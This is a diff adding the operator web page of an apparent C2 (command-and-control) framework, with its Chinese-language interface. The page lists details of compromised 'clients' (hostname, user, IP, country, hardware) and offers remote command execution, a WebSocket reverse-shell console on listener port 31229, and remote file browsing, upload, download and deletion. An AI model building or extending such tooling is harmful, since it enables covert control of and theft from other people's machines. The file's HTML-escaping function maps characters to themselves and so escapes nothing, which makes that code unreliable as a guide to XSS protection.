@@ -1,0 +1,1178 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rust C2 Framework - 客户端管理</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body data-client-id="{{ client.id }}">
+    <div class="container">
+        <div class="header">
+            <div>
+                <h1>客户端管理</h1>
+                <a href="/" class="back-btn">← 返回主页</a>
+            </div>
+        </div>
+
+        <div class="main-content-wrapper">
+            <div class="client-info-section">
+                <h2>客户端信息</h2>
+                <div class="info-grid">
+                    <div class="info-item">
+                        <label>客户端ID</label>
+                        <span><code>{{ client.id }}</code></span>
+                    </div>
+                    <div class="info-item">
+                        <label>主机名</label>
+                        <span>{{ client.hostname }}</span>
+                    </div>
+                    <div class="info-item">
+                        <label>用户名</label>
+                        <span>{{ client.username }}</span>
+                    </div>
+                    <div class="info-item">
+                        <label>操作系统</label>
+                        <span>{{ client.os }} ({{ client.arch }})</span>
+                    </div>
+                <div class="info-item">
+                    <label>IP地址</label>
+                    <span>{{ client.ip }}</span>
+                </div>
+                {% if let Some(country) = client.country_info %}
+                <div class="info-item">
+                    <label>国家信息</label>
+                    <span>{{ country }}</span>
+                </div>
+                {% endif %}
+                <div class="info-item">
+                    <label>CPU品牌</label>
+                    <span>{{ client.cpu_brand }}</span>
+                </div>
+                <div class="info-item">
+                    <label>CPU频率</label>
+                    <span>{{ client.cpu_frequency }} MHz</span>
+                </div>
+                <div class="info-item">
+                    <label>CPU核心</label>
+                    <span>{{ client.cpu_cores }}</span>
+                </div>
+                <div class="info-item">
+                    <label>内存</label>
+                    <span>{{ client.memory}} GB</span>
+                </div>
+                <div class="info-item">
+                    <label>总磁盘空间</label>
+                    <span>{{ client.total_disk_space_gb }} GB</span>
+                </div>
+                <div class="info-item">
+                    <label>可用磁盘空间</label>
+                    <span>{{ client.available_disk_space_gb }} GB</span>
+                </div>
+                <div class="info-item">
+                    <label>连接时间</label>
+                    <span>{{ client.connected_at.format("%Y-%m-%d %H:%M:%S") }}</span>
+                </div>
+                    <div class="info-item">
+                        <label>最后活动</label>
+                        <span>{{ client.last_seen.format("%Y-%m-%d %H:%M:%S") }}</span>
+                    </div>
+                    <div class="info-item">
+                        <label>状态</label>
+                        <span id="client-status">
+                            <!-- 状态将通过JavaScript动态更新 -->
+                        </span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="command-and-results">
+                <div class="tabs">
+                    <div class="tab-header">
+                        <div class="tab-item active" data-tab="command">命令执行</div>
+                        <div class="tab-item" data-tab="reverse-shell">反弹Shell</div>
+                        <div class="tab-item" data-tab="file">文件管理</div>
+                    </div>
+                    
+                    <div class="tab-content active" id="command-tab">
+                        <!-- 命令执行控制面板 -->
+                        <div class="command-control-panel">
+                            <div class="control-header">
+                                <div class="control-title">
+                                    <h2>
+                                        <span class="shell-icon">⚡</span>
+                                        命令执行控制台
+                                    </h2>
+                                </div>
+                            </div>
+                            
+                            <!-- 快捷命令面板 -->
+                            <div class="quick-commands-panel">
+                                <h3>
+                                    <span class="panel-icon">🚀</span>
+                                    常用命令
+                                </h3>
+                                <div class="quick-commands-grid">
+                                    <button class="quick-cmd-enhanced" onclick="setCommand('whoami')">
+                                        <span class="cmd-icon">👤</span>
+                                        <span class="cmd-text">whoami</span>
+                                    </button>
+                                    <button class="quick-cmd-enhanced" onclick="setCommand('pwd')">
+                                        <span class="cmd-icon">📍</span>
+                                        <span class="cmd-text">pwd</span>
+                                    </button>
+                                    <button class="quick-cmd-enhanced" onclick="setCommand('ls -la')">
+                                        <span class="cmd-icon">📁</span>
+                                        <span class="cmd-text">ls -la</span>
+                                    </button>
+                                    <button class="quick-cmd-enhanced" onclick="setCommand('ps aux')">
+                                        <span class="cmd-icon">⚙️</span>
+                                        <span class="cmd-text">ps aux</span>
+                                    </button>
+                                    <button class="quick-cmd-enhanced" onclick="setCommand('netstat -anop')">
+                                        <span class="cmd-icon">🌐</span>
+                                        <span class="cmd-text">netstat</span>
+                                    </button>
+                                    <button class="quick-cmd-enhanced" onclick="setCommand('uname -a')">
+                                        <span class="cmd-icon">💻</span>
+                                        <span class="cmd-text">uname -a</span>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- 命令输入面板 -->
+                            <div class="command-input-panel">
+                                <h3>
+                                    <span class="panel-icon">📝</span>
+                                    自定义命令
+                                </h3>
+                                <div class="command-form-enhanced">
+                                    <div class="input-group">
+                                        <span class="input-prompt">$</span>
+                                        <input type="text" id="commandInput" class="command-input-enhanced" placeholder="输入要执行的命令..." />
+                                        <button class="btn-execute" onclick="executeCommand()">
+                                            <span class="btn-icon">▶️</span>
+                                            执行
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- 结果显示面板 -->
+                        <div class="results-panel">
+                            <div class="panel-header">
+                                <h3>
+                                    <span class="panel-icon">📊</span>
+                                    执行结果
+                                </h3>
+                                <button class="btn-refresh" onclick="refreshResults()">
+                                    <span class="btn-icon">🔄</span>
+                                    刷新
+                                </button>
+                            </div>
+                            
+                            {% if commands.is_empty() %}
+                                <div class="no-results-enhanced">
+                                    <div class="empty-state">
+                                        <span class="empty-icon">📋</span>
+                                        <h4>暂无命令执行记录</h4>
+                                        <p>执行命令后，结果将显示在这里</p>
+                                    </div>
+                                </div>
+                            {% else %}
+                                <div class="results-container">
+                                    {% for cmd in commands %}
+                                    <div class="result-card">
+                                        <div class="result-header">
+                                            <div class="command-info">
+                                                <span class="command-text">{{ cmd.command }}</span>
+                                                <span class="execution-time">{{ cmd.executed_at.format("%Y-%m-%d %H:%M:%S") }}</span>
+                                            </div>
+                                            <div class="exit-code {% if cmd.exit_code == 0 %}success{% else %}error{% endif %}">
+                                                {% if cmd.exit_code == 0 %}✅{% else %}❌{% endif %} {{ cmd.exit_code }}
+                                            </div>
+                                        </div>
+                                        <div class="result-content">
+                                            {% if !cmd.stdout.is_empty() %}
+                                                <div class="output-section">
+                                                    <div class="output-label">📤 输出</div>
+                                                    <div class="output-stdout">{{ cmd.stdout }}</div>
+                                                </div>
+                                            {% endif %}
+                                            {% if !cmd.stderr.is_empty() %}
+                                                <div class="output-section">
+                                                    <div class="output-label">⚠️ 错误</div>
+                                                    <div class="output-stderr">{{ cmd.stderr }}</div>
+                                                </div>
+                                            {% endif %}
+                                        </div>
+                                    </div>
+                                    {% endfor %}
+                                </div>
+                            {% endif %}
+                        </div>
+                    </div>
+
+                    <div class="tab-content" id="reverse-shell-tab">
+                        <div class="reverse-shell-container">
+                            <!-- 顶部控制面板 -->
+                            <div class="shell-control-panel">
+                                <div class="control-header">
+                                    <div class="control-title">
+                                        <h2>
+                                            <span class="shell-icon">💻</span>
+                                            反弹Shell控制台
+                                        </h2>
+                                    </div>
+                                    <div class="control-actions">
+                                        <button class="btn-shell-start" id="startShellBtn" onclick="startReverseShell()">
+                                            <span class="btn-icon">🚀</span>
+                                            启动反弹Shell
+                                        </button>
+                                        <button class="btn-shell-stop" id="stopShellBtn" onclick="stopReverseShell()" style="display: none;">
+                                            <span class="btn-icon">🛑</span>
+                                            关闭Shell
+                                        </button>
+                                    </div>
+                                </div>
+                                
+                                <!-- 连接状态卡片 -->
+                                <div class="connection-status-grid">
+                                    <div class="status-card">
+                                        <div class="status-card-header">
+                                            <span class="status-card-icon">🔗</span>
+                                            <span class="status-card-title">连接状态</span>
+                                        </div>
+                                        <div class="status-card-content">
+                                            <div class="status-display">
+                                                <div class="status-indicator" id="connectionStatus"></div>
+                                                <span class="status-text" id="reverseShellStatus">未启动</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="status-card">
+                                        <div class="status-card-header">
+                                            <span class="status-card-icon">🆔</span>
+                                            <span class="status-card-title">会话ID</span>
+                                        </div>
+                                        <div class="status-card-content">
+                                            <code class="session-id" id="reverseShellSessionId">无</code>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="status-card">
+                                        <div class="status-card-header">
+                                            <span class="status-card-icon">🔌</span>
+                                            <span class="status-card-title">监听端口</span>
+                                        </div>
+                                        <div class="status-card-content">
+                                            <code class="port-number">31229</code>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- 终端容器 -->
+                            <div class="shell-container">
+                                <div class="shell-header">
+                                    <div class="shell-header-left">
+                                        <div class="window-controls">
+                                            <span class="window-control close"></span>
+                                            <span class="window-control minimize"></span>
+                                            <span class="window-control maximize"></span>
+                                        </div>
+                                        <span class="shell-title">Terminal</span>
+                                    </div>
+                                    <div class="shell-header-right">
+                                        <div class="connection-indicator">
+                                            <div class="status-dot" id="connectionStatusDot"></div>
+                                            <span class="connection-text" id="connectionStatusText">未连接</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="shell-terminal" id="shellTerminal" tabindex="0">
+                                    <div class="shell-welcome" id="shellWelcome" style="display: none;">
+                                        <div class="welcome-banner">
+                                            <div class="welcome-icon">🎯</div>
+                                            <div class="welcome-text">
+                                                <strong>反弹Shell连接已建立</strong>
+                                                <p>您现在可以执行远程命令</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="shell-output" id="shellOutput"></div>
+                                    <div class="shell-input-line" id="shellInputLine" style="display: none;">
+                                        <span class="shell-prompt">$</span>
+                                        <span class="shell-input" id="shellInput" contenteditable="true"></span>
+                                        <span class="shell-cursor" id="shellCursor"></span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tab-content" id="file-tab">
+                        <div class="file-manager">
+                            <div class="file-manager-header">
+                                <h2>
+                                    <span class="shell-icon">📁</span>
+                                    文件管理
+                                </h2>
+                                <div class="file-path-nav">
+                                    <input type="text" id="currentPath" class="path-input" value="/" />
+                                    <button class="btn" onclick="listDirectory()">浏览</button>
+                                    <button class="btn" onclick="goToParentDirectory()">上级目录</button>
+                                </div>
+                            </div>
+                            
+                            <div class="file-upload-section">
+                                <h3>
+                                    <span class="panel-icon">📤</span>
+                                    文件上传
+                                </h3>
+                                <div class="upload-controls">
+                                    <label for="fileUpload" class="btn btn-sm">选择文件</label>
+                                    <input type="file" id="fileUpload" style="display: none;" onchange="updateFileName(this)" />
+                                    <span id="fileNameDisplay">未选择任何文件</span>
+                                    <button type="button" class="btn btn-sm" onclick="uploadFile()">上传</button>
+                                </div>
+                            </div>
+                            
+                            <div class="file-list-section">
+                                <h3>
+                                    <span class="panel-icon">📋</span>
+                                    目录内容
+                                </h3>
+                                <table class="file-table">
+                                    <thead>
+                                        <tr>
+                                            <th>名称</th>
+                                            <th>类型</th>
+                                            <th>大小</th>
+                                            <th>权限</th>
+                                            <th>所有者</th>
+                                            <th>修改时间</th>
+                                            <th>操作</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="fileList">
+                                        <!-- 文件列表将通过JavaScript动态填充 -->
+                                    </tbody>
+                                </table>
+                            </div>
+                            <div class="loading-indicator" id="loadingFiles" style="display: none;">
+                                <div class="loading-content">
+                                    <div class="loading-spinner"></div>
+                                    <span>加载中...</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Load modular JavaScript files -->
+    <script src="/static/js/common.js"></script>
+    <script src="/static/js/tabs.js"></script>
+    <script src="/static/js/command-execution.js"></script>
+    <script src="/static/js/reverse-shell.js"></script>
+    <script src="/static/js/file-manager.js"></script>
+    
+    <script>
+        // 动态更新客户端状态
+        function updateClientStatus() {
+            const lastSeen = new Date('{{ client.last_seen.format("%Y-%m-%dT%H:%M:%SZ") }}');
+            const now = new Date();
+            const diffInSeconds = (now - lastSeen) / 1000;
+            
+            const statusElement = document.getElementById('client-status');
+            if (diffInSeconds < 60) {
+                statusElement.innerHTML = '<span class="status online">在线</span>';
+            } else {
+                statusElement.innerHTML = '<span class="status offline">离线</span>';
+            }
+        }
+
+        // 页面加载时更新状态
+        updateClientStatus();
+
+        // 命令执行功能
+        function setCommand(command) {
+            document.getElementById('commandInput').value = command;
+        }
+
+        async function executeCommand() {
+            const command = document.getElementById('commandInput').value.trim();
+            if (!command) {
+                alert('请输入命令');
+                return;
+            }
+
+            try {
+                const response = await fetch(`/api/clients/{{ client.id }}/commands`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({
+                        client_id: '{{ client.id }}',
+                        command: command,
+                        args: []
+                    })
+                });
+
+                if (response.ok) {
+                    alert('命令已发送');
+                    document.getElementById('commandInput').value = '';
+                    // 1秒后刷新结果
+                    setTimeout(refreshResults, 1000);
+                } else {
+                    alert('发送命令失败');
+                }
+            } catch (error) {
+                alert('发送命令时出错: ' + error.message);
+            }
+        }
+
+        let shellWebSocket = null; // 全局WebSocket实例
+        let currentShellConnectionId = null; // 当前shell连接ID
+
+        async function startReverseShell() {
+            if (confirm('确定要启动反弹Shell吗？')) {
+                try {
+                    const response = await fetch(`/api/clients/{{ client.id }}/reverse_shell`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        credentials: 'same-origin',
+                        body: JSON.stringify({}) // No body needed for this request
+                    });
+
+                    if (response.ok) {
+                        const data = await response.json();
+                        
+                        alert('反弹Shell请求已发送');
+                        document.getElementById('reverseShellStatus').textContent = '请求已发送，正在等待连接...';
+                        document.getElementById('reverseShellSessionId').textContent = '等待连接';
+                        document.getElementById('connectionStatus').className = 'status-indicator connecting';
+                        document.getElementById('connectionStatusDot').className = 'status-dot connecting';
+                        document.getElementById('connectionStatusText').textContent = '连接中';
+                        
+                        // 等待一段时间让客户端建立连接，然后获取连接列表
+                        setTimeout(async () => {
+                            await checkForReverseShellConnections();
+                        }, 3000); // 等待3秒
+
+                    } else {
+                        alert('发送反弹Shell请求失败');
+                        document.getElementById('reverseShellStatus').textContent = '启动失败';
+                        document.getElementById('reverseShellSessionId').textContent = '无';
+                        document.getElementById('connectionStatus').className = 'status-indicator';
+                        document.getElementById('connectionStatusDot').className = 'status-dot';
+                        document.getElementById('connectionStatusText').textContent = '启动失败';
+                    }
+                } catch (error) {
+                    alert('发送请求时出错: ' + error.message);
+                    document.getElementById('reverseShellStatus').textContent = '启动失败: ' + error.message;
+                    document.getElementById('reverseShellSessionId').textContent = '无';
+                    document.getElementById('connectionStatus').className = 'status-indicator';
+                    document.getElementById('connectionStatusDot').className = 'status-dot';
+                    document.getElementById('connectionStatusText').textContent = '启动失败';
+                }
+            }
+        }
+
+        async function checkForReverseShellConnections() {
+            try {
+                const response = await fetch('/api/reverse_shells', {
+                    method: 'GET',
+                    credentials: 'same-origin'
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.connections && data.connections.length > 0) {
+                        // 使用最新的连接
+                        const connectionId = data.connections[data.connections.length - 1];
+                        document.getElementById('reverseShellSessionId').textContent = connectionId;
+                        
+                        // 建立WebSocket连接
+                        connectWebSocket(connectionId);
+                    } else {
+                        document.getElementById('reverseShellStatus').textContent = '等待连接建立...';
+                        // 继续轮询
+                        setTimeout(async () => {
+                            await checkForReverseShellConnections();
+                        }, 2000);
+                    }
+                } else {
+                    document.getElementById('reverseShellStatus').textContent = '获取连接列表失败';
+                }
+            } catch (error) {
+                console.error('检查连接失败:', error);
+                document.getElementById('reverseShellStatus').textContent = '检查连接失败';
+            }
+        }
+
+        function connectWebSocket(connectionId) {
+            // 保存当前连接ID
+            currentShellConnectionId = connectionId;
+            
+            if (shellWebSocket) {
+                shellWebSocket.close();
+            }
+
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}/ws/shell/${connectionId}`;
+            shellWebSocket = new WebSocket(wsUrl);
+
+            const shellOutput = document.getElementById('shellOutput');
+            const shellInput = document.getElementById('shellInput');
+            const shellInputLine = document.getElementById('shellInputLine');
+            const shellTerminal = document.getElementById('shellTerminal');
+
+            // 命令历史
+            let commandHistory = [];
+            let historyIndex = -1;
+
+            shellWebSocket.onopen = () => {
+                document.getElementById('reverseShellStatus').textContent = '已连接';
+                document.getElementById('connectionStatus').className = 'status-indicator connected';
+                document.getElementById('connectionStatusDot').className = 'status-dot connected';
+                document.getElementById('connectionStatusText').textContent = '已连接';
+                
+                // 切换按钮状态
+                document.getElementById('startShellBtn').style.display = 'none';
+                document.getElementById('stopShellBtn').style.display = 'flex';
+                
+                // 清空输出并立即显示输入行在顶部
+                shellOutput.textContent = '';
+                shellInputLine.style.display = 'flex';
+                shellInput.focus();
+                
+                // 确保终端滚动到顶部
+                shellTerminal.scrollTop = 0;
+                
+                // 终端获得焦点
+                shellTerminal.focus();
+            };
+
+            shellWebSocket.onmessage = (event) => {
+                const data = event.data;
+                shellOutput.textContent += data;
+                scrollToBottom();
+                
+                // 简化逻辑：收到任何数据后显示输入行
+                // 这样用户就可以继续输入下一个命令
+                if (!shellInputLine.style.display || shellInputLine.style.display === 'none') {
+                    setTimeout(() => {
+                        shellInputLine.style.display = 'flex';
+                        shellInput.focus();
+                    }, 100); // 稍微延迟确保输出完成
+                }
+            };
+
+            shellWebSocket.onclose = () => {
+                document.getElementById('reverseShellStatus').textContent = '已断开';
+                document.getElementById('connectionStatus').className = 'status-indicator';
+                document.getElementById('connectionStatusDot').className = 'status-dot';
+                document.getElementById('connectionStatusText').textContent = '已断开';
+                
+                // 重置按钮状态
+                document.getElementById('startShellBtn').style.display = 'flex';
+                document.getElementById('stopShellBtn').style.display = 'none';
+                currentShellConnectionId = null;
+                
+                shellInputLine.style.display = 'none';
+                const shellWelcome = document.getElementById('shellWelcome');
+                shellWelcome.style.display = 'none';
+                
+                const disconnectMsg = document.createElement('div');
+                disconnectMsg.className = 'shell-error';
+                disconnectMsg.textContent = 'Shell连接已断开。';
+                shellOutput.appendChild(disconnectMsg);
+                scrollToBottom();
+            };
+
+            shellWebSocket.onerror = (error) => {
+                console.error('WebSocket Error:', error);
+                document.getElementById('reverseShellStatus').textContent = '连接错误';
+                document.getElementById('connectionStatus').className = 'status-indicator';
+                document.getElementById('connectionStatusDot').className = 'status-dot';
+                document.getElementById('connectionStatusText').textContent = '连接错误';
+                
+                // 重置按钮状态
+                document.getElementById('startShellBtn').style.display = 'flex';
+                document.getElementById('stopShellBtn').style.display = 'none';
+                currentShellConnectionId = null;
+                
+                const errorMsg = document.createElement('div');
+                errorMsg.className = 'shell-error';
+                errorMsg.textContent = `连接错误: ${error.message || '未知错误'}`;
+                shellOutput.appendChild(errorMsg);
+                scrollToBottom();
+            };
+
+            // 键盘事件处理
+            function handleKeyDown(e) {
+                if (!shellWebSocket || shellWebSocket.readyState !== WebSocket.OPEN) {
+                    return;
+                }
+
+                switch (e.key) {
+                    case 'Enter':
+                        e.preventDefault();
+                        const command = shellInput.textContent;
+                        if (command.trim()) {
+                            // 添加到历史
+                            commandHistory.push(command);
+                            historyIndex = commandHistory.length;
+                            
+                            // 发送命令
+                            shellWebSocket.send(command + '\n');
+                            
+                            // 在输出中显示命令
+                            shellOutput.textContent += command + '\n';
+                            
+                            // 清空输入
+                            shellInput.textContent = '';
+                            
+                            // 隐藏输入行，等待响应
+                            shellInputLine.style.display = 'none';
+                        }
+                        break;
+                        
+                    case 'ArrowUp':
+                        e.preventDefault();
+                        if (historyIndex > 0) {
+                            historyIndex--;
+                            shellInput.textContent = commandHistory[historyIndex];
+                            // 将光标移到末尾
+                            moveCaretToEnd(shellInput);
+                        }
+                        break;
+                        
+                    case 'ArrowDown':
+                        e.preventDefault();
+                        if (historyIndex < commandHistory.length - 1) {
+                            historyIndex++;
+                            shellInput.textContent = commandHistory[historyIndex];
+                            moveCaretToEnd(shellInput);
+                        } else {
+                            historyIndex = commandHistory.length;
+                            shellInput.textContent = '';
+                        }
+                        break;
+                        
+                    case 'Tab':
+                        e.preventDefault();
+                        // 可以在这里实现自动补全
+                        break;
+                        
+                    case 'c':
+                        if (e.ctrlKey) {
+                            e.preventDefault();
+                            // Ctrl+C 发送中断信号
+                            shellWebSocket.send('\x03');
+                            shellOutput.textContent += '^C\n$ ';
+                            shellInput.textContent = '';
+                            shellInputLine.style.display = 'flex';
+                        }
+                        break;
+                }
+            }
+
+            function moveCaretToEnd(el) {
+                if (typeof window.getSelection != "undefined" && typeof document.createRange != "undefined") {
+                    var range = document.createRange();
+                    range.selectNodeContents(el);
+                    range.collapse(false);
+                    var sel = window.getSelection();
+                    sel.removeAllRanges();
+                    sel.addRange(range);
+                }
+            }
+
+            function scrollToBottom() {
+                // 只有当有实际输出内容时才滚动到底部
+                if (shellOutput.textContent.trim().length > 0) {
+                    shellTerminal.scrollTop = shellTerminal.scrollHeight;
+                }
+            }
+
+            // 添加事件监听器
+            shellInput.addEventListener('keydown', handleKeyDown);
+            shellTerminal.addEventListener('click', () => {
+                shellInput.focus();
+            });
+            
+            // 保持焦点
+            setInterval(() => {
+                if (shellInputLine.style.display !== 'none' && document.activeElement !== shellInput) {
+                    shellInput.focus();
+                }
+            }, 100);
+        }
+
+        // 移除旧的sendShellCommand函数，现在通过回车键发送
+
+        async function stopReverseShell() {
+            if (!currentShellConnectionId) {
+                alert('没有活动的Shell连接');
+                return;
+            }
+
+            if (confirm('确定要关闭当前的Shell连接吗？')) {
+                try {
+                    const response = await fetch(`/api/reverse_shells/${currentShellConnectionId}/close`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        credentials: 'same-origin'
+                    });
+
+                    if (response.ok) {
+                        const data = await response.json();
+                        alert(data.message);
+                        
+                        // 关闭WebSocket连接
+                        if (shellWebSocket) {
+                            shellWebSocket.close();
+                            shellWebSocket = null;
+                        }
+                        
+                        // 重置UI状态
+                        resetShellUI();
+                        currentShellConnectionId = null;
+                        
+                    } else {
+                        const errorText = await response.text();
+                        alert('关闭Shell连接失败: ' + errorText);
+                    }
+                } catch (error) {
+                    alert('关闭Shell连接时出错: ' + error.message);
+                }
+            }
+        }
+
+        function resetShellUI() {
+            // 重置按钮状态
+            document.getElementById('startShellBtn').style.display = 'flex';
+            document.getElementById('stopShellBtn').style.display = 'none';
+            
+            // 重置状态显示
+            document.getElementById('reverseShellStatus').textContent = '未启动';
+            document.getElementById('reverseShellSessionId').textContent = '无';
+            document.getElementById('connectionStatus').className = 'status-indicator';
+            document.getElementById('connectionStatusDot').className = 'status-dot';
+            document.getElementById('connectionStatusText').textContent = '未连接';
+            
+            // 清空终端内容
+            const shellOutput = document.getElementById('shellOutput');
+            if (shellOutput) {
+                shellOutput.textContent = '';
+            }
+            
+            // 隐藏输入行
+            const shellInputLine = document.getElementById('shellInputLine');
+            if (shellInputLine) {
+                shellInputLine.style.display = 'none';
+            }
+        }
+
+        function refreshResults() {
+            location.reload();
+        }
+
+        // 回车键执行命令
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('commandInput').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    executeCommand();
+                }
+            });
+            
+            document.getElementById('currentPath').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    listDirectory();
+                }
+            });
+        });
+
+        // 文件管理功能
+        let currentPath = '/';
+        
+        function renderFileList(serverResponse) {
+            const fileList = document.getElementById('fileList');
+            fileList.innerHTML = '';
+
+            console.log('Rendering file list with server response:', serverResponse);
+
+            // Extract entries from the server response
+            let entries = [];
+            if (serverResponse && serverResponse.data && serverResponse.data.entries) {
+                entries = serverResponse.data.entries;
+            }
+
+            console.log('Extracted entries:', entries);
+
+            if (!Array.isArray(entries) || entries.length === 0) {
+                fileList.innerHTML = '<tr><td colspan="7" class="no-results">目录为空</td></tr>';
+                return;
+            }
+
+            // 排序：先文件夹后文件，按名称字符大小排序
+            entries.sort((a, b) => {
+                if (a.is_dir !== b.is_dir) {
+                    return a.is_dir ? -1 : 1; // 文件夹排在前面
+                }
+                return a.name.localeCompare(b.name, 'zh-CN'); // 按字符大小排序
+            });
+
+            entries.forEach(entry => {
+                console.log('Processing entry:', entry);
+
+                const tr = document.createElement('tr');
+
+                // 名称列，包含图标
+                const nameCell = document.createElement('td');
+                if (entry.is_dir) {
+                    nameCell.innerHTML = `<span class="file-icon">📁</span>
+                                        <span class="directory" onclick="navigateToDirectory('${escapeHtml(entry.path)}')">${escapeHtml(entry.name)}</span>`;
+                } else {
+                    nameCell.innerHTML = `<span class="file-icon">📄</span> ${escapeHtml(entry.name)}`;
+                }
+                nameCell.title = entry.path; // 添加完整路径的tooltip
+
+                // 类型列
+                const typeCell = document.createElement('td');
+                typeCell.textContent = entry.is_dir ? '目录' : '文件';
+
+                // 大小列
+                const sizeCell = document.createElement('td');
+                if (entry.is_dir) {
+                    sizeCell.textContent = '-';
+                } else {
+                    const fileSize = entry.size;
+                    if (typeof fileSize === 'number') {
+                        sizeCell.textContent = formatFileSize(fileSize);
+                    } else {
+                        sizeCell.textContent = '0 Bytes';
+                    }
+                }
+
+                // 权限列
+                const permissionsCell = document.createElement('td');
+                if (entry.permissions) {
+                    permissionsCell.innerHTML = `<span class="permissions">${escapeHtml(entry.permissions)}</span>`;
+                } else {
+                    permissionsCell.textContent = '-';
+                }
+
+                // 所有者列
+                const ownerCell = document.createElement('td');
+                if (entry.owner && entry.group) {
+                    ownerCell.innerHTML = `<span class="owner-group">${escapeHtml(entry.owner)}:${escapeHtml(entry.group)}</span>`;
+                } else if (entry.owner) {
+                    ownerCell.innerHTML = `<span class="owner-group">${escapeHtml(entry.owner)}</span>`;
+                } else {
+                    ownerCell.innerHTML = '<span class="owner-group">-</span>';
+                }
+
+                // 修改时间列
+                const timeCell = document.createElement('td');
+                if (entry.modified) {
+                    let modifiedDate;
+                    if (typeof entry.modified === 'object' && entry.modified.tv_sec !== undefined) {
+                        // 处理SystemTime格式 {tv_sec: ..., tv_nsec: ...}
+                        modifiedDate = new Date(entry.modified.tv_sec * 1000);
+                    } else if (typeof entry.modified === 'object' && entry.modified.secs_since_epoch !== undefined) {
+                        // 处理其他时间格式
+                        modifiedDate = new Date(entry.modified.secs_since_epoch * 1000);
+                    } else if (typeof entry.modified === 'string') {
+                        modifiedDate = new Date(entry.modified);
+                    } else if (typeof entry.modified === 'number') {
+                        modifiedDate = new Date(entry.modified);
+                    } else {
+                        modifiedDate = null;
+                    }
+
+                    if (modifiedDate && !isNaN(modifiedDate.getTime())) {
+                        timeCell.textContent = modifiedDate.toLocaleString('zh-CN', {
+                            year: 'numeric',
+                            month: '2-digit',
+                            day: '2-digit',
+                            hour: '2-digit',
+                            minute: '2-digit'
+                        });
+                    } else {
+                        timeCell.textContent = '-';
+                    }
+                } else {
+                    timeCell.textContent = '-';
+                }
+
+                // 操作列
+                const actionCell = document.createElement('td');
+                actionCell.className = 'file-actions';
+
+                if (entry.is_dir) {
+                    actionCell.innerHTML = `
+                        <button class="btn btn-sm" onclick="navigateToDirectory('${escapeHtml(entry.path)}')">打开</button>
+                        <button class="btn btn-sm btn-danger" onclick="deletePath('${escapeHtml(entry.path)}')">删除</button>
+                    `;
+                } else {
+                    actionCell.innerHTML = `
+                        <a href="/api/files/download/${encodeURIComponent(entry.path)}?client_id={{ client.id }}" class="btn btn-sm">下载</a>
+                        <button class="btn btn-sm btn-danger" onclick="deletePath('${escapeHtml(entry.path)}')">删除</button>
+                    `;
+                }
+                
+                tr.appendChild(nameCell);
+                tr.appendChild(typeCell);
+                tr.appendChild(sizeCell);
+                tr.appendChild(permissionsCell);
+                tr.appendChild(ownerCell);
+                tr.appendChild(timeCell);
+                tr.appendChild(actionCell);
+                
+                fileList.appendChild(tr);
+            });
+        }
+        
+        // 添加HTML转义函数以防止XSS
+        function escapeHtml(text) {
+            const map = {
+                '&': '&',
+                '<': '<',
+                '>': '>',
+                '"': '"',
+                "'": '&#039;'
+            };
+            return text.replace(/[&<>"']/g, function(m) { return map[m]; });
+        }
+        
+        async function listDirectory() {
+            const path = document.getElementById('currentPath').value.trim();
+            if (!path) {
+                alert('请输入有效路径');
+                return;
+            }
+            
+            currentPath = path;
+            document.getElementById('loadingFiles').style.display = 'block';
+            document.querySelector('.file-upload-section').style.display = 'none';
+            document.querySelector('.file-list-section').style.display = 'none';
+            document.getElementById('fileList').innerHTML = '';
+            
+            try {
+                console.log('Sending request to list directory:', path); // Debug log
+                
+                const response = await fetch(`/api/files/list`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({
+                        client_id: '{{ client.id }}',
+                        path: path,
+                        recursive: false
+                    })
+                });
+                
+                console.log('Response status:', response.status); // Debug log
+                console.log('Response headers:', Object.fromEntries(response.headers.entries())); // Debug log
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    console.log('Full response data:', data); // Debug log
+                    
+                    if (data.success) {
+                        // 直接传递整个data对象到renderFileList
+                        renderFileList(data);
+                    } else {
+                        console.error('Server returned error:', data.message);
+                        alert(`获取文件列表失败: ${data.message}`);
+                        document.getElementById('fileList').innerHTML = '<tr><td colspan="7" class="no-results">获取文件列表失败</td></tr>';
+                    }
+                } else {
+                    console.error('HTTP error:', response.status);
+                    const errorText = await response.text();
+                    console.error('Error response body:', errorText);
+                    
+                    try {
+                        const error = JSON.parse(errorText);
+                        alert(`获取文件列表失败: ${error.message || 'Unknown error'}`);
+                    } catch (e) {
+                        alert(`获取文件列表失败: HTTP ${response.status}`);
+                    }
+                    document.getElementById('fileList').innerHTML = '<tr><td colspan="7" class="no-results">获取文件列表失败</td></tr>';
+                }
+            } catch (error) {
+                console.error('Error fetching file list:', error);
+                alert('获取文件列表时出错: ' + error.message);
+                document.getElementById('fileList').innerHTML = '<tr><td colspan="7" class="no-results">网络连接错误</td></tr>';
+            } finally {
